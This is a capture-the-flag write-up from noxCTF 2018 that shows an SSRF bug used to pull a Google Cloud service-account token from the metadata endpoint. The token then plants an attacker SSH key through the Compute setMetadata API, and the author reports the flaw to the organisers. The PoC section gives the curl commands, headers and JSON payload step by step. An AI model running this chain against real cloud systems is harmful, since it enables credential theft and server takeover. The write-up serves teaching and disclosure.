# noxCTF-2018-PSRF-as-Pwn

## Introduction
This article was a CTF (Capture the flag) writeup, and it shows a common mistake that happend when designing a CTF challange.
Basically, it shows if a challenge can access the internal network, and the machine is on a Cloud service provider, then you might have the chance to take it over.
The following are the technique details.

## Story
When I was play [noxCTF 2018](https://ctftime.org/event/671), I saw a challenge named PSRF and it under web category, then I thought that might be SSRF, PostScript, or both.  
Then I decided to look at that.
I trying to solve it by the way I think it should be, but I always got HTTP 500 when I trying to access another server, so I decided to use another way to do it.

There are some terms that usually appear on CTF and Information Security Area
- SSRF: [Server-Side Request Forgery](https://en.wikipedia.org/wiki/Server-side_request_forgery)
It is become a common vulnerability after [this presentation by Orange](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
- PostScript: [Wikipedia](https://en.wikipedia.org/wiki/PostScript)
  Ghostscript is its common interpreter, and there are [multiple vulnerabilities](https://www.exploit-db.com/exploits/45243/) disclose recently. It was one of the [challenge](https://ctftime.org/task/6522) of [TokyoWesterns CTF 4th 2018](https://ctftime.org/event/651)

## Recon
The challenge provide an input box and a radio box, and it will send a HTTP GET request to 
`http://35.241.245.36/api/v1/upload?url=http://your_url&method=get`  
like this, and it will return an image name, and the result of the SSRF will store under `http://35.241.245.36/images/`  
  
The challenge has kubernetes logo on the bottom of the page like the screenshot below, and the IP is 35.241.245.36.  
![Page Screenshot](https://github.com/seadog007/noxCTF-2018-PSRF-as-Pwn/raw/master/%E8%9E%A2%E5%B9%95%E5%BF%AB%E7%85%A7%202018-09-10%20%E4%B8%8A%E5%8D%883.10.19.png)  
  
I immediately realized that is a GCP machine, so I tested the backend server by sending HTTP request to my server to see if it is also on GCP, and it is.  
![GCP determine](https://github.com/seadog007/noxCTF-2018-PSRF-as-Pwn/raw/master/%E8%9E%A2%E5%B9%95%E5%BF%AB%E7%85%A7%202018-09-10%20%E4%B8%8A%E5%8D%883.38.42.png) 

## Cloud Based Attack
I think there is not much people know about [http://metadata.google.internal](http://metadata.google.internal).  
Well, basically, it is a "feature" provided by Google Cloud Platform, you can use it to access information about the project and instances, but it also include the time limited API token of service account under the project. It is enable by the default.

## PoC
1. Sending SSRF Payload and get the result  
```
curl -s 'http://35.241.245.36/images/'`curl -s "http://35.241.245.36/api/v1/upload?url=http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token&method=get"`
```

2. And you will get something like this, one access token, and it's type, which is Bearer.
```
{"access_token":"xxxxxxxxxx","expires_in":3063,"token_type":"Bearer"}
```

3. Doing this for other information we need  
```
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/name
http://metadata.google.internal/computeMetadata/v1/instance/zone
```

4. Now, you can use this API on your own computer `https://www.googleapis.com/compute/v1/projects/{}/zones/{}/instances/{}`  
  With header
```
Metadata-Flavor: Google
Authorization: Bearer xxxxxxxx_token_from_first_step_xxxxxxxx
```

5. You will get some thing like this.
```
.........................
 ],
 "metadata": {
  "kind": "compute#metadata",
  "fingerprint": "2bsm86CRs-0=",
  "items": [
   {
    "key": "instance-template",
    "value": "projects/720594190990/global/instanceTemplates/gke-psrf-dev-default-pool-9ae6b68d"
   },
   {
    "key": "created-by",
    "value": "projects/720594190990/zones/europe-west1-b/instanceGroupManagers/gke-psrf-dev-default-pool-9ae6b68d-grp"
   },
   {
    "key": "gci-update-strategy",
    "value": "update_disabled"
   }
.........................
```
    We only need the fingerprint

6. Set the ssh key
Send a POST request to this link with the header and data
`https://www.googleapis.com/compute/v1/projects/{}/zones/{}/instances/{}/setMetadata`  
```
Metadata-Flavor: Google
Authorization: Bearer xxxxxxxx_token_from_first_step_xxxxxxxx
Content-Type: application/json
```
```
{
  "fingerprint":"2bsm86CRs-0=",
  "items": [
    {
      "key": "sshKeys",
      "value": "username:ssh-rsa AAAAB..................4KeQzSMFH userid"
    }
  ]
}
```
7. You just replace the original ssh key to yours.
P.S. You can also do this on the whole project.  
The API detail can be found on [Managing SSH keys in Metadata](https://cloud.google.com/compute/docs/instances/adding-removing-ssh-keys)

## Solving the challenge by not its design
I ssh to the server. I know it is using kubernetes, so I run `docker ps`  
![docker ps](https://github.com/seadog007/noxCTF-2018-PSRF-as-Pwn/raw/master/%E8%9E%A2%E5%B9%95%E5%BF%AB%E7%85%A7%202018-09-10%20%E4%B8%8A%E5%8D%883.57.22.png)

Then `docker exec -it xxxxxxxxx /bin/sh`  
Then `ls`

![source code](https://github.com/seadog007/noxCTF-2018-PSRF-as-Pwn/raw/master/%E8%9E%A2%E5%B9%95%E5%BF%AB%E7%85%A7%202018-09-07%20%E4%B8%8B%E5%8D%8811.10.32.png)

Easy, just solved the challenge by looking at the source code

## Follow up
I report this security issue to the team, and just fix it pretty quick.  
![coversation_1](https://github.com/seadog007/noxCTF-2018-PSRF-as-Pwn/raw/master/%E8%9E%A2%E5%B9%95%E5%BF%AB%E7%85%A7%202018-09-07%20%E4%B8%8B%E5%8D%8811.28.22.png)  
![coversation_2](https://github.com/seadog007/noxCTF-2018-PSRF-as-Pwn/raw/master/%E8%9E%A2%E5%B9%95%E5%BF%AB%E7%85%A7%202018-09-07%20%E4%B8%8B%E5%8D%8811.43.38.png)

## Applicable environment
Not only GCP has these kind of management interface, you can also found similar thing on AWS.  
Most of CTF use docker to host challenges, but in most of the challenges that don't limit the network, so it is possible to do a privilege escalation on pwn or web challenges.

## References
[Twistlock Protection for Kubernetes Specific Attacks](https://www.twistlock.com/2018/05/30/twistlock-protection-kubernetes-specific-attacks/)
